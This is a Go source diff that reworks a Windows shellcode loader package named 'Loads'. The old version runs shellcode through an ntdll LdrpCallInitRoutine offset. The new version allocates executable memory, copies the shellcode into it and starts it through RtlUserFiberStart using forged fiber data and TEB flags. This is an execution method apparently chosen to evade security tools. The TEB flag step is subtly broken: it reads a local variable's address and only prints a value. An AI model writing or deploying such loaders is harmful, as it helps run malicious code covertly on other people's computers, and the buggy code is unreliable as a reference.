@@ -1,6 +1,9 @@
 package Loads
 
 import (
+	"fmt"
+	"golang.org/x/sys/windows"
+	"log"
 	"syscall"
 	"unsafe"
 )
@@ -11,32 +14,44 @@ var (
 )
 
 const (
-	MEM_COMMIT                  = 0x1000
-	MEM_RESERVE                 = 0x2000
-	PAGE_EXECUTE_READWRITE      = 0x40
-	NULL                        = 0
-	NTDLL_LDRPCALLINITRT_OFFSET = 0x000199bc
+	MEM_COMMIT               = 0x1000
+	MEM_RESERVE              = 0x2000
+	PAGE_EXECUTE_READWRITE   = 0x40
+	TEB_FIBERDATA_PTR_OFFSET = 0x17ee
+	HEAP_ZERO_MEMORY         = 0x00000008
 )
 
 var (
-	kernel32          = syscall.MustLoadDLL("kernel32.dll")
-	ntdll             = syscall.MustLoadDLL("ntdll.dll")
-	VirtualAlloc      = kernel32.MustFindProc("VirtualAlloc")
-	GetCurrentProcess = kernel32.MustFindProc("GetCurrentProcess")
-	GetModuleHandleA  = kernel32.MustFindProc("GetModuleHandleA")
-	RtlMoveMemory     = ntdll.MustFindProc("RtlMoveMemory")
+	kernel32       = syscall.MustLoadDLL("kernel32.dll")
+	ntdll          = syscall.MustLoadDLL("ntdll.dll")
+	VirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
+	HeapAlloc      = kernel32.MustFindProc("HeapAlloc")
+	GetProcessHeap = kernel32.MustFindProc("GetProcessHeap")
+	RtlMoveMemory  = ntdll.MustFindProc("RtlMoveMemory")
 )
 
 func Callback(shellcode []byte) {
-	_, _, _ = GetCurrentProcess.Call()
-
+	hNtdll, err := windows.LoadLibrary("ntdll")
+	if err != nil {
+		log.Fatal(err)
+	}
+	RtlUserFiberStart, err1 := windows.GetProcAddress(hNtdll, "RtlUserFiberStart")
+	if err1 != nil {
+		log.Fatal(err1)
+	}
+	NtCurrentTeb, err2 := windows.GetProcAddress(hNtdll, "NtCurrentTeb")
+	if err2 != nil {
+		log.Fatal(err2)
+	}
+	teb, _, _ := syscall.SyscallN(NtCurrentTeb, 0)
+	pTebFlags := teb + TEB_FIBERDATA_PTR_OFFSET
+	pTebFlags1 := *(*int)(unsafe.Pointer(&pTebFlags)) | 0b100
+	fmt.Println(pTebFlags1)
 	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
 	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-
-	p1, _ := syscall.UTF16PtrFromString("ntdll")
-	hNtdll, _, _ := GetModuleHandleA.Call(uintptr(unsafe.Pointer(p1)))
-	func1 := hNtdll + uintptr(NTDLL_LDRPCALLINITRT_OFFSET)
-	func2 := (*func(p1 uintptr, p2 uintptr, p3 uintptr, p4 uintptr))(unsafe.Pointer(func1))
-	LdrpCallInitRoutine := *func2
-	LdrpCallInitRoutine(addr, 0, 0, 0)
+	p1, _, _ := GetProcessHeap.Call()
+	lpDummyFiberData, _, _ := HeapAlloc.Call(p1, HEAP_ZERO_MEMORY, 0x100)
+	p2 := (*uintptr)(unsafe.Pointer(lpDummyFiberData + 0x0a8))
+	*p2 = addr
+	syscall.SyscallN(RtlUserFiberStart, 0)
 }
